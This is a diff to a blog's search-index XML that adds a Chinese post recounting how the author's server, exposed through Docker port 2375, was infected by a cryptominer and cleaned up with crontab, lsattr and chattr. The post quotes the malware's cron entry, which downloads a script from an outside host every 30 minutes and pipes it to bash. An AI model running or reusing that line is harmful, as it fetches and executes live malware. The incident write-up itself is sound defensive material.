@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>记一次服务器遭到挖矿病毒感染的经历</title>
+      <link href="/2022/05/17/deal-with-viruses-in-the-server/"/>
+      <url>/2022/05/17/deal-with-viruses-in-the-server/</url>
+      
+        <content type="html"><![CDATA[<h1 id="记一次服务器遭到挖矿病毒感染的经历"><a href="#记一次服务器遭到挖矿病毒感染的经历" class="headerlink" title="记一次服务器遭到挖矿病毒感染的经历"></a>记一次服务器遭到挖矿病毒感染的经历</h1><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在鼓捣docker，看了一些教程，为了方便一些操作打开了2375端口，导致被人docker注入了。</p><h2 id="应对过程"><a href="#应对过程" class="headerlink" title="应对过程"></a>应对过程</h2><p>其实我之前完全没有面对过服务器遭到病毒攻击的问题…最开始是腾讯云给我发短信，说我的服务器存在危险行为，并且封禁了这台服务器一天。</p><p>当时一上去我就感觉到不对了，服务器上经常莫名奇妙多一个docker镜像，删了也没用。</p><p>后面我使用<code>crontab -l</code>排查了一下定时任务，发现里面有一个奇怪的任务。</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">*/30 * * * * /usr/bin/cdz -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | bash &gt; /dev/null 2&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看样子这就是问题所在了，它会定时下载一个脚本文件并且执行。那么只要把它删掉不就完事大吉了？</p><p>于是我试图用<code>crontab -e</code>删掉它，最后却发现无法编辑这个配置。</p><blockquote><p>“/tmp/crontab.Awo30z” 1L, 1C written<br>crontab: installing new crontab<br>/var/spool/cron/#tmp.VM-16-8-centos.XXXX6iXbXz: Operation not permitted<br>crontab: edits left in /tmp/crontab.Awo30z</p></blockquote><p>病毒怎么可能会让你轻松的删掉这个定时任务？它修改了文件的属性，让它无法被修改——即便你拥有root的最高权限。</p><p>百度后找到了解决方案</p><blockquote><p> 查看是否有特殊的属性 lsattr /var/spool/cron/ </p><p> 去掉特殊的属性 chattr -ai /var/spool/cron/root  &amp;&amp; lsattr /var/spool/cron/root</p></blockquote><p>但是有一点很奇怪，我的腾讯云机器上无法使用chattr指令。他会询问我是否安装一个包，但真安装时却说这个包已经安装过了，不知道这是不是病毒搞得鬼。</p><blockquote><p>[root@VM-16-8-centos lighthouse]# chattr -i /var/spool/cron<br>bash: chattr: command not found…<br>Install package ‘e2fsprogs’ to provide command ‘chattr’? [N/y] y  </p><ul><li>Waiting in queue… Failed to install packages: e2fsprogs-1.45.6-2.tl3.x86_64 is already installed</li></ul></blockquote><p>于是我把包给卸载重装了一次，就可以了</p><blockquote><p>yum remove e2fsprogs-1.45.6-2.tl3.x86_64</p></blockquote><p>去除特殊权限后就可以编辑定时任务了。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 杂谈 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 运维 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>为人生做些减法</title>
       <link href="/2022/02/23/do-some-subtraction-to-my-life/"/>
       <url>/2022/02/23/do-some-subtraction-to-my-life/</url>
@@ -252,9 +277,9 @@
             
             <tag> Kotlin </tag>
             
-            <tag> Android </tag>
-            
             <tag> 知识梳理 </tag>
+            
+            <tag> Android </tag>
             
         </tags>
       
